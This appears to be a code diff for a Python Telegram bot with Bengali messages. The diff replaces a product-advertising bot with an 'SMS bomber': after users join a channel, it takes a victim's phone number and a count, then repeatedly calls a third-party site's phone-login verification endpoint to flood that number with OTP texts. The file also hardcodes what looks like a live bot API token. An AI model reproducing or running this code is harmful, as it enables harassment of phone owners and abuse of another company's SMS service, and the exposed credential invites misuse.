@@ -2,39 +2,89 @@ import telebot
 import requests
 import time
 from telebot import types
+from flask import Flask
+from threading import Thread
 
 # ১. সেটিংস
 API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
 CHANNEL_USERNAME = '@developer_of_maruf' 
-PHOTO_URL = "https://i.ibb.co/6R0VjY8/banner.jpg" 
-WHATSAPP_LINK = "https://wa.me/8801621743805"
 
 bot = telebot.TeleBot(API_TOKEN)
+user_data = {}
+
+# ২. Render সার্ভার সচল রাখার জন্য Flask
+app = Flask('')
+@app.route('/')
+def home(): return "Bot is Online!"
+
+def run():
+    app.run(host='0.0.0.0', port=8080)
+
+def keep_alive():
+    t = Thread(target=run)
+    t.start()
 
 def check_join(chat_id):
     try:
         status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
         return status in ['member', 'administrator', 'creator']
-    except Exception as e:
-        print(f"Error checking join: {e}")
+    except:
         return False
 
+# ৩. স্টার্ট কমান্ড (কোনো বিজ্ঞাপন নেই)
 @bot.message_handler(commands=['start'])
 def welcome(message):
     chat_id = message.chat.id
     if check_join(chat_id):
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("🛒 অর্ডার করুন (WhatsApp)", url=WHATSAPP_LINK))
-        
-        # ছবি পাঠাতে চেষ্টা করবে, না পারলে শুধু লেখা পাঠাবে
-        try:
-            bot.send_photo(chat_id, PHOTO_URL, caption="✨ **মৃত্তিকা অরিজিনাল হলুদ** ✨\n১০০% খাঁটি ও ভেজাল মুক্ত।", parse_mode="Markdown", reply_markup=markup)
-        except:
-            bot.send_message(chat_id, "✨ **মৃত্তিকা অরিজিনাল হলুদ** ✨\n\n✅ ভেরিফিকেশন সফল! SMS পাঠাতে নাম্বার দিন:", reply_markup=markup)
+        bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল হয়েছে!**", parse_mode="Markdown")
+        time.sleep(1)
+        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন আপনার নাম্বারটি দিন (১১ ডিজিট):")
+        bot.register_next_step_handler(msg, get_number)
     else:
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
-        bot.send_message(chat_id, "❌ আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)
+        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify_join"))
+        bot.send_message(chat_id, "❌ বোটটি ব্যবহার করতে আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
+def verify_join(call):
+    if check_join(call.message.chat.id):
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        welcome(call.message)
+    else:
+        bot.answer_callback_query(call.id, "❌ জয়েন হননি!", show_alert=True)
+
+# ৪. নাম্বার ও বোম্বিং লজিক
+def get_number(message):
+    if message.text == "/start":
+        welcome(message)
+        return
+    if not message.text or not message.text.isdigit() or len(message.text) < 11:
+        msg = bot.send_message(message.chat.id, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
+        bot.register_next_step_handler(msg, get_number)
+        return
+        
+    user_data[message.chat.id] = message.text
+    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান?")
+    bot.register_next_step_handler(msg, send_bomber)
+
+def send_bomber(message):
+    try:
+        amount = int(message.text)
+        num = user_data[message.chat.id]
+        
+        # ১০০০ এর বেশি সংখ্যা দিলে লিমিট করে দেওয়া ভালো
+        if amount > 100: amount = 100 
+        
+        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
+        
+        for i in range(amount):
+            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
+            
+        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
+    except:
+        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা দিন।")
 
 if __name__ == "__main__":
+    keep_alive()
     bot.infinity_polling(skip_pending=True)
